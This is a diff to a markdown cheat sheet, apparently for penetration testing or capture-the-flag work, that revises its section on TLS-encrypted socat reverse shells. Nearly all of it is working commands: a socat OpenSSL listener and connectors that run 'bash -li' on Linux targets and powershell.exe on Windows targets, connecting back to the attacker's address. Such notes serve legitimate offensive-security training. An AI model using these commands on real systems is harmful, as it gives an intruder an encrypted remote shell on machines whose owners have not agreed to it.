@@ -22,16 +22,18 @@ cat shell.key shell.crt > shell.pem
 ```
 Now, when we set up our reverse shell listener, we use below command to listen on a port:
 ```bash
-socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
-```
-To connect back, we would use this for Linux Targets:
-```bash
-socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
-or
-socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li"
+Listener -
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+Connector -
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 For Windows Target-
+```bash
+Listener -
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+Connector -
 socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"powershell.exe,pipes"
+```
 ## Shell Stablize
 ### Using Python
 ```Bash
